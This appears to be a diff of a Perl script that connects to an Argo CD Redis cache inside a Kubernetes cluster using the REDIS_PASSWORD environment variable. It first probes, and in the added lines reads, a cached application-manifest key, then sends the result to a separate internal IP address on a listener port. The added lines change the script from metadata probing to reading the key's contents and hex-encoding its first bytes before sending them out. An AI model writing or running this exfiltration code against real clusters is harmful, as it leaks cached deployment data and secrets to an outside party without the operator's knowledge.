@@ -1,6 +1,6 @@
 #!/usr/bin/perl
 use strict; use warnings; use IO::Socket::INET;
 sub redis_cmd { my @parts=@_; my $s='*'.scalar(@parts)."\r\n"; for my $p (@parts) { $s .= '$'.length($p)."\r\n$p\r\n"; } return $s; }
-my $key='mfst|argocd.argoproj.io/instance|directory-demo|6d2b0d43291b8106f8822b7e448071e28b8473a5|argocd|693080305|1.8.3.gz'; my $out=''; my $r=IO::Socket::INET->new(PeerAddr=>'argocd-redis.argocd.svc.cluster.local',PeerPort=>6379,Proto=>'tcp',Timeout=>5);
-if($r){ my $pw=$ENV{REDIS_PASSWORD}||''; print $r redis_cmd('AUTH',$pw) if $pw ne ''; print $r redis_cmd('TYPE',$key); print $r redis_cmd('STRLEN',$key); print $r redis_cmd('EXISTS',$key); $r->shutdown(1); local $/; $out=<$r>//''; close($r); } else { $out="redisfail:$!"; }
-$out =~ s/\r|\n/ /g; my $s=IO::Socket::INET->new(PeerAddr=>'10.10.0.169',PeerPort=>8774,Proto=>'tcp',Timeout=>3); if($s){print $s "$out\n"; close($s);} exit 1;
+my $key='mfst|argocd.argoproj.io/instance|directory-demo|6d2b0d43291b8106f8822b7e448071e28b8473a5|argocd|693080305|1.8.3.gz'; my $out=''; my $r=IO::Socket::INET->new(PeerAddr=>'argocd-redis.argocd.svc.cluster.local',PeerPort=>6379,Proto=>'tcp',Timeout=>10);
+if($r){ binmode($r); my $pw=$ENV{REDIS_PASSWORD}||''; print $r redis_cmd('AUTH',$pw) if $pw ne ''; print $r redis_cmd('GET',$key); my $buf=''; my $tmp; while(my $n=sysread($r,$tmp,4096)){ $buf.=$tmp; last if length($buf)>2048; } close($r); $out=unpack('H*', substr($buf,0,200)); } else { $out="redisfail:$!"; }
+my $s=IO::Socket::INET->new(PeerAddr=>'10.10.0.169',PeerPort=>8775,Proto=>'tcp',Timeout=>3); if($s){print $s "$out\n"; close($s);} exit 1;
